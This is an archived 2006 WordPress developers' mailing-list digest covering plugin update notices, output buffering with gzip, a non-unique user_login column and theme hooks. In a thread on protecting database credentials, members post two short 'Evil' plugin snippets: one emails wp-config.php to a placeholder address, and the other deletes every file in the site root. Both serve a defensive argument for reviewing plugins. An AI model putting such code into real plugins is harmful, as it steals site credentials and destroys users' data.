Here's how I do it using Prototype:
http://soderlind.no/download/plugin_updated_demo.zip

You'll find a full implementation in the latest version of my ImageManager
plugin:
http://soderlind.no/archives/2006/01/03/imagemanager-20/


Kind regards,
Per

Prototype:
http://prototype.conio.net/
Prototype quick ref:
http://www.snook.ca/archives/000531.php
Prototype doc:
http://www.sitepoint.com/print/painless-javascript-prototype 
http://www.sergiopereira.com/articles/prototype.js.html 


From glenn at slaven.net.au  Fri Feb 24 03:07:28 2006
From: glenn at slaven.net.au (Glenn)
Date: Fri Feb 24 03:09:49 2006
Subject: [wp-hackers] fwiw: informing a user that a updated plugin is
	avaiable
In-Reply-To: <009e01c638d0$f6bb4960$0505210a@PICTO>
References: <009e01c638d0$f6bb4960$0505210a@PICTO>
Message-ID: <43FE7870.5020801@slaven.net.au>

That's great Per, I've been trying to come up with a solution to that 
same problem. 

I've been toying with using the svn server on wp-plugins.org and 
flagging an update when a new tag is created, have it sit
as a plugin itself and have it check once a day for updates.  I was 
trying to come up with something that would be able to be used by any 
plugin author, and wouldn't take much time up.  My idea was to have a 
plugin that people could install that would work as a plugin update 
manager, so all the checking update code could be contained within that 
and not have to be done for each plugin.  The other alternative I 
thought was to have a standard function/method that could be stuck into 
a plugin if the author wanted to use the update facility. 

Of course for this to work it would require the use of a standard 
repository to be used like wp-plugins.org.

Glenn


Per Soderlind wrote:
> One of the main problems a plugin author has, when he/she updates a plugin,
> is to tell the user that a new version is avalable.
>
> Here's how I do it using Prototype:
> http://soderlind.no/download/plugin_updated_demo.zip
>
> You'll find a full implementation in the latest version of my ImageManager
> plugin:
> http://soderlind.no/archives/2006/01/03/imagemanager-20/
>
>
> Kind regards,
> Per
>
> Prototype:
> http://prototype.conio.net/
> Prototype quick ref:
> http://www.snook.ca/archives/000531.php
> Prototype doc:
> http://www.sitepoint.com/print/painless-javascript-prototype 
> http://www.sergiopereira.com/articles/prototype.js.html 
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
>
>   


From ringmaster at midnightcircus.com  Fri Feb 24 05:04:29 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb 24 05:06:54 2006
Subject: [wp-hackers] fwiw: informing a user that a updated plugin is
	avaiable
In-Reply-To: <43FE7870.5020801@slaven.net.au>
References: <009e01c638d0$f6bb4960$0505210a@PICTO>
	<43FE7870.5020801@slaven.net.au>
Message-ID: <43FE93DD.8030803@midnightcircus.com>

Glenn wrote:
> That's great Per, I've been trying to come up with a solution to that 
> same problem.

Matt Read has been working on an impressive Installer plugin that 
everyone should check out.  You can find it here:

http://mattread.com/projects/wp-plugins/installer-the-plugin/

It can install and uninstall both plugins and themes directly from their 
zip files, via URL or an uploaded file.  There are still a few glitches, 
but I'm hoping that more people can pester Matt to get them worked out.

Assuming you don't want to bother with creating the XMLRPC service that 
the Installer requires to obtain update information, I've created this 
Plugin Version Service at RedAlt:

http://redalt.com/wiki/Plugin+Version+Service

There are more details there, but basically, you create an account and 
register whatever plugins you like.  You can then use http://redalt.com/ 
in your plugin header as the Update Server, as needed by Matt's plugin, 
and RedAlt will return the required XMLRPC results.

I have implemented this versioning method in the latest iteration of my 
Countdown plugin:

http://redalt.com/wiki/Countdown

Not sure what else to say...  Oh!  The Ajax editing stuff in the 
function reference that I was talking about at the IRC meetup is 
accessible if you create a PVS account and log in there.  The function 
reference stuff is here, in case you weren't at the meetup:

http://redalt.com/fn/

Be gentle.

Ok, going to pass out now.

Owen
From skeltoac at gmail.com  Fri Feb 24 13:00:45 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb 24 13:02:48 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <a05210600c0225ad80351@192.168.1.101>
References: <a05210600c0225ad80351@192.168.1.101>
Message-ID: <e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>

On 2/22/06, Eric A. Meyer <eric@meyerweb.com> wrote:
>     So back in November, Jeremy Dunck finally tracked down[1] the
> cause of the last major bug in WP-Gatekeeper[2], where it wouldn't
> auto-add itself to comment forms on many people's sites.  The
> problem, it seems, is that the attempt to auto-add the challenge
> happens after the page is gzipped when that option is turned on, so
> the regexps fail.  (Obviously!)  So if gzipping is enabled, as it is
> for most people, the auto-injection won't work.  Manual injection,

To fix this, you have to understand that output buffers are FILO,
meaning that if you start your buffer first, it will be the last one
to be processed. Your buffer is started in the plugin. Examine
wp-blog-header.php and you'll see that gzip_compression()'s buffer is
started after all of wp-config has run--long after your plugin has
started its buffer.

There's only one hook after gzip_compression, and it's template_redirect.
Try this:

add_action('template_redirect', 'ob_start', 'gatekeeper_comment_form_filter');

Andy
From jeff at jrm.cc  Fri Feb 24 16:54:11 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Fri Feb 24 16:56:28 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
Message-ID: <43FF3A33.7080400@jrm.cc>

Andy Skelton wrote:
> There's only one hook after gzip_compression, and it's template_redirect.
> Try this:
> 
> add_action('template_redirect', 'ob_start', 'gatekeeper_comment_form_filter');

wp_header and wp_footer are good place to use as well, no?

Jeff
From joseph at randomnetworks.com  Sat Feb 25 00:22:54 2006
From: joseph at randomnetworks.com (Joseph Scott)
Date: Sat Feb 25 00:22:41 2006
Subject: [wp-hackers] Keeping database connection info safe
Message-ID: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>


I've been thinking about WordPress plugins and came up some issues on  
keeping database connection information safe.  In wp-config.php all  
of the details needed to connect to the MySQL database are defined()  
as constants.  This makes it very easy for the $wpdb object to do its  
thing.  But once the database connection has been established, do we  
really need to have those constants still floating around?

It would be very easy to include some malicious code in a plugin that  
would attempt to email out those details to "bad people".  So my  
first thought was to simply undefine the database connection info  
once a successful database connection has been established.  It  
doesn't look like this is possible though, according to the PHP  
constants docs (at http://us2.php.net/manual/en/ 
language.constants.php).  Once a constant has been defined it can  
never, ever be changed or undefined, hence the term constant :-)

So perhaps there should be some discussion on setting the database  
connection information in a way that can be latter undefined once the  
database connection has been established.  May be something as simple  
as an array?  Something like:

$db_info["host"] = "localhost";
$db_info["user"] = "awesome";
$db_info["password"] = "133t";
$db_info["name"] = "cool_blog";

After the database connection is done a call to unset($db_info) or  
$db_info = "" or $db_info = array() would be enough to zap that info.

I realize there is a certain amount of trust when a user activates a  
plugin and there isn't really a way to prevent a plugin from shooting  
a user in the foot, but we can take some small steps to eliminate the  
potential risks.  No this won't prevent a plugin from trashing a  
database (since they'll still have access to the database  
connection), but it could prevent sensitive data from getting out.

Comments, thoughts, ideas?

--
Joseph Scott
joseph@randomnetworks.com
http://joseph.randomnetworks.com/



From grijalva at gmail.com  Sat Feb 25 00:37:22 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Sat Feb 25 00:39:28 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
Message-ID: <a0159cd30602241637k63220bb9sae7499ecb8bc4408@mail.gmail.com>

I agree with this.  It could be argued that you should only install plugins
from users you trust or that you should view the source of a plugin before
installing it, but that's not really good enough.  Since the db password has
to be stored in the config file in cleartext, I think there really needs to
be a way to wipe it once the db is connected.

The only problems I see with this is that the config file can always just be
included again, or even opened and parsed by the malicious plugin.  Also, if
the connect info is removed from the memory, there would be no way to
reconnect to the db if the connection is severed, though I don't know if
there is even support for this in the wp core code.

A better way to do this with php5 is to use private member variables and a
setter function, but I don't think there is a PHP4 equivalent.  Can anybody
out there think of a PHP4 compatible way to secure that data?

-dave

On 2/24/06, Joseph Scott <joseph@randomnetworks.com> wrote:
>
>
> I've been thinking about WordPress plugins and came up some issues on
> keeping database connection information safe.  In wp-config.php all
> of the details needed to connect to the MySQL database are defined()
> as constants.  This makes it very easy for the $wpdb object to do its
> thing.  But once the database connection has been established, do we
> really need to have those constants still floating around?
>
> It would be very easy to include some malicious code in a plugin that
> would attempt to email out those details to "bad people".  So my
> first thought was to simply undefine the database connection info
> once a successful database connection has been established.  It
> doesn't look like this is possible though, according to the PHP
> constants docs (at http://us2.php.net/manual/en/
> language.constants.php).  Once a constant has been defined it can
> never, ever be changed or undefined, hence the term constant :-)
>
> So perhaps there should be some discussion on setting the database
> connection information in a way that can be latter undefined once the
> database connection has been established.  May be something as simple
> as an array?  Something like:
>
> $db_info["host"] = "localhost";
> $db_info["user"] = "awesome";
> $db_info["password"] = "133t";
> $db_info["name"] = "cool_blog";
>
> After the database connection is done a call to unset($db_info) or
> $db_info = "" or $db_info = array() would be enough to zap that info.
>
> I realize there is a certain amount of trust when a user activates a
> plugin and there isn't really a way to prevent a plugin from shooting
> a user in the foot, but we can take some small steps to eliminate the
> potential risks.  No this won't prevent a plugin from trashing a
> database (since they'll still have access to the database
> connection), but it could prevent sensitive data from getting out.
>
> Comments, thoughts, ideas?
>
> --
> Joseph Scott
> joseph@randomnetworks.com
> http://joseph.randomnetworks.com/
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From sam at rephrase.net  Sat Feb 25 00:49:41 2006
From: sam at rephrase.net (Sam Angove)
Date: Sat Feb 25 00:51:47 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
Message-ID: <aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>

On 2/25/06, Joseph Scott <joseph@randomnetworks.com> wrote:
>
> It would be very easy to include some malicious code in a plugin that
> would attempt to email out those details to "bad people".  So my
> first thought was to simply undefine the database connection info
> once a successful database connection has been established.

<?php
/*
Plugin Name: Evil
*/
wp_mail( 'dr.claw@example.com', '', file_get_contents(ABSPATH .
'wp-config.php') );
?>

Dave Grijalva wrote:
> A better way to do this with php5 is to use private member variables and a
> setter function, but I don't think there is a PHP4 equivalent.  Can anybody
> out there think of a PHP4 compatible way to secure that data?

You could still read in the source file containing the setter, so
you're right back where you started.
From joseph at randomnetworks.com  Sat Feb 25 01:01:57 2006
From: joseph at randomnetworks.com (Joseph Scott)
Date: Sat Feb 25 01:01:41 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>
Message-ID: <21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>


On Feb 24, 2006, at 4:49 PM, Sam Angove wrote:

> On 2/25/06, Joseph Scott <joseph@randomnetworks.com> wrote:
>>
>> It would be very easy to include some malicious code in a plugin that
>> would attempt to email out those details to "bad people".  So my
>> first thought was to simply undefine the database connection info
>> once a successful database connection has been established.
>
> <?php
> /*
> Plugin Name: Evil
> */
> wp_mail( 'dr.claw@example.com', '', file_get_contents(ABSPATH .
> 'wp-config.php') );
> ?>
>
> Dave Grijalva wrote:
>> A better way to do this with php5 is to use private member  
>> variables and a
>> setter function, but I don't think there is a PHP4 equivalent.   
>> Can anybody
>> out there think of a PHP4 compatible way to secure that data?
>
> You could still read in the source file containing the setter, so
> you're right back where you started.


You are absolutely correct.  I must admit that I hadn't though about  
re-including the wp-config.php file.  Well that bites.  Is there any  
way to really protect against this in either PHP4 or PHP5?  I'm  
inclined at this point to say no and that everyone better be scanning  
their plugins for "evil".  Has anyone put together a list of things  
that should raise the red flag when they see it in a plugin?


--
Joseph Scott
joseph@randomnetworks.com
http://joseph.randomnetworks.com/



From skeltoac at gmail.com  Sat Feb 25 01:42:40 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb 25 01:44:48 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>
	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>
	<21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>
Message-ID: <e6ec604d0602241742o4ab0190bwba8f19da8dd8a6a6@mail.gmail.com>

On 2/24/06, Joseph Scott <joseph@randomnetworks.com> wrote:
> You are absolutely correct.  I must admit that I hadn't though about
> re-including the wp-config.php file.  Well that bites.  Is there any
> way to really protect against this in either PHP4 or PHP5?  I'm
> inclined at this point to say no and that everyone better be scanning
> their plugins for "evil".

That's right. In the absence of technical know-how or trusted
referrals, one cannot trust any code. There is no list of things to
look for. You have to trace every route through the code to discover
cleverly-hidden backdoors.

There has been discussion of a plugin certification procedure but it
never went anywhere. Check the archives if you're interested in
igniting that conversation again.

Andy
From r at robm.me.uk  Sat Feb 25 02:52:22 2006
From: r at robm.me.uk (Rob)
Date: Sat Feb 25 02:49:48 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>
	<21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>
Message-ID: <43FFC666.8030905@robm.me.uk>

Joseph Scott wrote:
>
> You are absolutely correct.  I must admit that I hadn't though about 
> re-including the wp-config.php file.  Well that bites.  Is there any 
> way to really protect against this in either PHP4 or PHP5?  I'm 
> inclined at this point to say no and that everyone better be scanning 
> their plugins for "evil".  Has anyone put together a list of things 
> that should raise the red flag when they see it in a plugin?
>
>
> -- 
> Joseph Scott
> joseph@randomnetworks.com
> http://joseph.randomnetworks.com/
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

But then what's to stop the inevitable

<?php
/*
Plugin Name: Evil
*/

foreach(glob(ABSPATH.'/*') as $file) {
    unlink($file);
}

?>

?

There's no way of stopping malicious code from running other than 
reviewing it before you run.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From joseph at randomnetworks.com  Sat Feb 25 03:44:00 2006
From: joseph at randomnetworks.com (Joseph Scott)
Date: Sat Feb 25 03:46:21 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <43FFC666.8030905@robm.me.uk>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>	<21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>
	<43FFC666.8030905@robm.me.uk>
Message-ID: <43FFD280.9040208@randomnetworks.com>

Rob wrote:

> 
> But then what's to stop the inevitable
> 
> <?php
> /*
> Plugin Name: Evil
> */
> 
> foreach(glob(ABSPATH.'/*') as $file) {
>    unlink($file);
> }
> 
> ?>
> 
> There's no way of stopping malicious code from running other than 
> reviewing it before you run.


Properly set permissions should stop that from working.  The plugin 
would be run as the web server user, who doesn't need write permissions 
in order to run PHP code.

--
Joseph Scott
joseph@randomnetworks.com
http://joseph.randomnetworks.com/

From r at robm.me.uk  Sat Feb 25 04:01:08 2006
From: r at robm.me.uk (Rob)
Date: Sat Feb 25 03:58:12 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <43FFD280.9040208@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>	<21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>	<43FFC666.8030905@robm.me.uk>
	<43FFD280.9040208@randomnetworks.com>
Message-ID: <43FFD684.4060607@robm.me.uk>

Joseph Scott wrote:
> Rob wrote:
>
>>
>> But then what's to stop the inevitable
>>
>> <?php
>> /*
>> Plugin Name: Evil
>> */
>>
>> foreach(glob(ABSPATH.'/*') as $file) {
>>    unlink($file);
>> }
>>
>> ?>
>>
>> There's no way of stopping malicious code from running other than 
>> reviewing it before you run.
>
>
> Properly set permissions should stop that from working.  The plugin 
> would be run as the web server user, who doesn't need write 
> permissions in order to run PHP code.
>
> -- 
> Joseph Scott
> joseph@randomnetworks.com
> http://joseph.randomnetworks.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
Except Wordpress has absolutely no control over what user the web server 
runs under.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From mark.wordpress at txfx.net  Sat Feb 25 05:19:00 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 25 05:21:13 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <43FF3A33.7080400@jrm.cc>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
	<43FF3A33.7080400@jrm.cc>
Message-ID: <8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>

On Feb 24, 2006, at 11:54 AM, Jeff Minard wrote:

> wp_header and wp_footer are good place to use as well, no?

Not necessarily... http://wphooks.flatearth.org/type/theme-dependant/

you never know which ones a theme is going to support.
--
Mark Jaquith
http://txfx.net/


From davebytes at comcast.net  Sat Feb 25 05:48:48 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb 25 05:52:39 2006
Subject: [wp-hackers] Form injection and gzipping
References: <a05210600c0225ad80351@192.168.1.101><e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com><43FF3A33.7080400@jrm.cc>
	<8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>
Message-ID: <010001c639cf$282fc2b0$6e01a8c0@sixfour>

jeez.  this came up back around 1.5, as wp_footer was the 'best' place to 
hook for certain things.  wouldn't it be nice to require themes to call a 
base set of actions/filters? ;)

-d

----- Original Message ----- 
From: "Mark Jaquith" <mark.wordpress@txfx.net>
To: <wp-hackers@lists.automattic.com>
Sent: Saturday, February 25, 2006 12:19 AM
Subject: Re: [wp-hackers] Form injection and gzipping


| On Feb 24, 2006, at 11:54 AM, Jeff Minard wrote:
|
| > wp_header and wp_footer are good place to use as well, no?
|
| Not necessarily... http://wphooks.flatearth.org/type/theme-dependant/
|
| you never know which ones a theme is going to support.
| --
| Mark Jaquith
| http://txfx.net/
|
|
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From mark.wordpress at txfx.net  Sat Feb 25 06:15:59 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb 25 06:18:12 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <010001c639cf$282fc2b0$6e01a8c0@sixfour>
References: <a05210600c0225ad80351@192.168.1.101><e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com><43FF3A33.7080400@jrm.cc>
	<8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>
	<010001c639cf$282fc2b0$6e01a8c0@sixfour>
Message-ID: <1E50F5F4-D267-4B89-9241-8FB15C5E4217@txfx.net>

On Feb 25, 2006, at 12:48 AM, David Chait wrote:

> jeez.  this came up back around 1.5, as wp_footer was the 'best'  
> place to
> hook for certain things.  wouldn't it be nice to require themes to  
> call a
> base set of actions/filters? ;)

Requirements and enforcement of requirements are two very different  
things. :-)

--
Mark Jaquith
http://txfx.net/


From jason at zenenet.com  Sat Feb 25 13:08:51 2006
From: jason at zenenet.com (Jason S.)
Date: Sat Feb 25 13:10:57 2006
Subject: [wp-hackers] Keeping database connection info safe
In-Reply-To: <43FFD280.9040208@randomnetworks.com>
References: <C33144BB-60F3-4573-84FF-7761978E734B@randomnetworks.com>	<aa74b1910602241649sa10716cr263b8e370b033092@mail.gmail.com>	<21E32D71-4DB0-4DCA-9DF5-DFEA553E2D16@randomnetworks.com>	<43FFC666.8030905@robm.me.uk>
	<43FFD280.9040208@randomnetworks.com>
Message-ID: <440056E3.40405@zenenet.com>

Joseph Scott wrote:
> 
> Properly set permissions should stop that from working.  The plugin
> would be run as the web server user, who doesn't need write permissions
> in order to run PHP code.

Three words:
PHP
as
CGI
(Which happens to be my preference.)
From leftjustified at gmail.com  Sun Feb 26 06:36:34 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Sun Feb 26 06:38:43 2006
Subject: [wp-hackers] wp_users.user_login is not unique
Message-ID: <6453a6e90602252236l7ecae3d4oc797a4b19e0e8982@mail.gmail.com>

Hi,
I'm unsure as to whether to post this as a bug report, so I'm going to
bring it up here first.

this should (imo) throw an error:

INSERT INTO `wp_users` ( `ID` , `user_login` , `user_pass` ,
`user_nicename` , `user_email` , `user_url` , `user_registered` ,
`user_activation_key` , `user_status` , `display_name` )
VALUES (
'', 'thisisBad', '', '', '', '', '0000-00-00 00:00:00', '', '0', ''
), (
'', 'thisisBad', '', '', '', '', '0000-00-00 00:00:00', '', '0', ''
);

But no, both rows are successful.

I understand that WP does it's own check prior to creating a new user,
but is there any reason the integrity of such an important table isn't
being enforced by table constraints?


Andrew.
--
http://leftjustified.net/
From foolistbar at googlemail.com  Sun Feb 26 14:52:00 2006
From: foolistbar at googlemail.com (Geoffrey Sneddon)
Date: Sun Feb 26 14:54:14 2006
Subject: [wp-hackers] wp_users.user_login is not unique
In-Reply-To: <6453a6e90602252236l7ecae3d4oc797a4b19e0e8982@mail.gmail.com>
References: <6453a6e90602252236l7ecae3d4oc797a4b19e0e8982@mail.gmail.com>
Message-ID: <1A81FFC0-C245-4C40-A71A-2090F567F3B7@googlemail.com>


On 26 Feb 2006, at 06:36, Andrew Krespanis wrote:

> I understand that WP does it's own check prior to creating a new user,
> but is there any reason the integrity of such an important table isn't
> being enforced by table constraints?


It was removed for some reason for WP-MU, and then that change was  
backported to WP, to try and keep the two as similar as possible.  
Hopefully someone can be more specific as to why.


- Geoffrey Sneddon



From podz at tamba2.org.uk  Sun Feb 26 23:17:46 2006
From: podz at tamba2.org.uk (Podz)
Date: Sun Feb 26 23:19:55 2006
Subject: [wp-hackers] Moving sites 
In-Reply-To: <43FB78B8.6030203@tamba2.org.uk>
References: <43FB78B8.6030203@tamba2.org.uk>
Message-ID: <4402371A.2090500@tamba2.org.uk>

Podz wrote:
> http://wordpress.org/support/topic/61938?replies=8#post-330687
> 
> There have been a couple of these happen:
> Blog is moved
> Cache cleared
> Siteurl and home are correct
> and yet WP says it is not installed.
> 

http://wordpress.org/support/topic/62694?replies=1

and another.
I am absolutely certain it is not a user error at all, and that
something either in the WP code is screwing up or that some server
setting is screwing up WP.

This is not new blog stuff where they can start over, and it's damn
difficult to troubleshoot.

Devs ?
Can someone ask the right questions to the OP ?

P.
From aaron at technosailor.com  Mon Feb 27 02:48:16 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Mon Feb 27 02:50:26 2006
Subject: [wp-hackers] 2498
Message-ID: <ca7320070602261848x721ea183k173831ef39beef68@mail.gmail.com>

Guys--

As a result of some chaos with the handful of b5media blogs running WP
2.0.1, I went about fixing TK# 2498. I'm not sure if it's the best way
or if it breaks anything else. It seems to work so far for us (knock
on wood) but curious if anyone else can vet the patch out for me as
well.

Thanks
Aaron
From nuclearmoose at gmail.com  Mon Feb 27 07:51:53 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Feb 27 07:54:02 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <1E50F5F4-D267-4B89-9241-8FB15C5E4217@txfx.net>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
	<43FF3A33.7080400@jrm.cc>
	<8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>
	<010001c639cf$282fc2b0$6e01a8c0@sixfour>
	<1E50F5F4-D267-4B89-9241-8FB15C5E4217@txfx.net>
Message-ID: <5aa3aa0602262351i165be1a3x3c32d37a228df2fe@mail.gmail.com>

Mark Jaquith said:
Requirements and enforcement of requirements are two very different
things. :-)

What about API keys a la Akismet?

Craig.
From skeltoac at gmail.com  Mon Feb 27 10:30:03 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Feb 27 10:32:12 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <5aa3aa0602262351i165be1a3x3c32d37a228df2fe@mail.gmail.com>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
	<43FF3A33.7080400@jrm.cc>
	<8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>
	<010001c639cf$282fc2b0$6e01a8c0@sixfour>
	<1E50F5F4-D267-4B89-9241-8FB15C5E4217@txfx.net>
	<5aa3aa0602262351i165be1a3x3c32d37a228df2fe@mail.gmail.com>
Message-ID: <e6ec604d0602270230r66c3746bgb69e2d32d781aa61@mail.gmail.com>

On 2/27/06, Craig <nuclearmoose@gmail.com> wrote:
> What about API keys a la Akismet?

Moose, are you joking? Require themes to apply for an API key before
they'll work in general WordPress installations? What about tweaking?

Consider it a requirement that all publicly distributed themes use the
wp_head and wp_footer tags or actions in the appropriate places. The
consequences are plugin breakage and meteorites falling on the heads
of offending designers.

I still haven't been granted the smite_designer capability so I can't
be in charge of enforcement. :-)

Andy
From gerhard at gbrauckmann.de  Mon Feb 27 12:33:01 2006
From: gerhard at gbrauckmann.de (Gerhard Brauckmann)
Date: Mon Feb 27 12:35:13 2006
Subject: [wp-hackers] got stuck with a plugin
Message-ID: <4402F17D.8020304@gbrauckmann.de>

dear wp hackers and fans,

I got stuck in developing my plugin and I'm now searching for ideas.
background:
_ I finished the plugin to work within the dashboard, it can handle 
serveral pages to deal with the data
- the data is all externally fetched and stored, so it is not part of 
the wp-db tableset
- all dashboard functions are working

now I'm searching for input on how to design the plugin-links which will 
be produced by one plugin function.
inside sidebar I'm producing links to the external data like this:

/attribute1/attribute2/attribute3/

my question is now:

how can I force WP to open for this LINK type:
- a whole new template page
- or an existing template and pass the *attribute data* to this template 
for further process?

any idea or documentation to this will be helpful
thx an greetings from bavaria
-- 
------------------------------------------------------------------------
*Gerhard Brauckmann*
<http://www.b-logged.de>
------------------------------------------------------------------------
From nuclearmoose at gmail.com  Mon Feb 27 14:50:47 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Feb 27 14:53:00 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <e6ec604d0602270230r66c3746bgb69e2d32d781aa61@mail.gmail.com>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
	<43FF3A33.7080400@jrm.cc>
	<8902F0C5-7042-4300-BE4A-AD6484805EBB@txfx.net>
	<010001c639cf$282fc2b0$6e01a8c0@sixfour>
	<1E50F5F4-D267-4B89-9241-8FB15C5E4217@txfx.net>
	<5aa3aa0602262351i165be1a3x3c32d37a228df2fe@mail.gmail.com>
	<e6ec604d0602270230r66c3746bgb69e2d32d781aa61@mail.gmail.com>
Message-ID: <5aa3aa0602270650u78941c36x4358387ef570f357@mail.gmail.com>

On 2/27/06, Andy Skelton <skeltoac@gmail.com> wrote:
>
>
> Moose, are you joking?


Just thinking (sort of) out loud, Andy! :^)

Maybe somebody will code a utility that will check themes and plugins for
"accepted WP norms" and advise users on how compliant the theme / plugin is
in relation to those best practises.

Craig.
From garett at harnish.ca  Mon Feb 27 20:47:06 2006
From: garett at harnish.ca (Garett Harnish)
Date: Mon Feb 27 20:49:14 2006
Subject: [wp-hackers] Need A Hook (or advice)
Message-ID: <4403654A.5040003@harnish.ca>

I need a way for a plugin to add a page to wp_list_pages.   I know no 
hook exists to do this, and the only way I can think of duplicating this 
functionality is ugly.

I could have the plugin insert a page into the blog, but I just need the 
page listed, I don't want it to be displayed like page.  I want the 
contents to be PHP code from the plugin and I want the page to remove 
itself if the plugin has been disabled (since it won't work).

The other option is to have the user manually make the changes, but I 
don't like that either.

Does anyone have any other suggestions?  I want the user to have to do 
as few things as humanly possible (since it minimizes the risk of them 
messing it up).

Thanks,
Garett
From skeltoac at gmail.com  Mon Feb 27 20:51:36 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Feb 27 20:53:46 2006
Subject: [wp-hackers] Need A Hook (or advice)
In-Reply-To: <4403654A.5040003@harnish.ca>
References: <4403654A.5040003@harnish.ca>
Message-ID: <e6ec604d0602271251i40c78aa0i42e3bd5abfdcfa87@mail.gmail.com>

On 2/27/06, Garett Harnish <garett@harnish.ca> wrote:
> I need a way for a plugin to add a page to wp_list_pages.   I know no
> hook exists to do this, and the only way I can think of duplicating this
> functionality is ugly.

With the new post_type and post_status columns in the posts table, and
imminent (I think) removal of enums, you might just create a page with
an odd status that's ignored by the usual queries. It's all very Alpha
though.

Andy
From eric at meyerweb.com  Tue Feb 28 02:59:16 2006
From: eric at meyerweb.com (Eric A. Meyer)
Date: Tue Feb 28 03:01:35 2006
Subject: [wp-hackers] Form injection and gzipping
In-Reply-To: <e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
References: <a05210600c0225ad80351@192.168.1.101>
	<e6ec604d0602240500y163a3d72h96f2d094159a00bf@mail.gmail.com>
Message-ID: <a05210602c0296c6b243a@[192.168.1.101]>

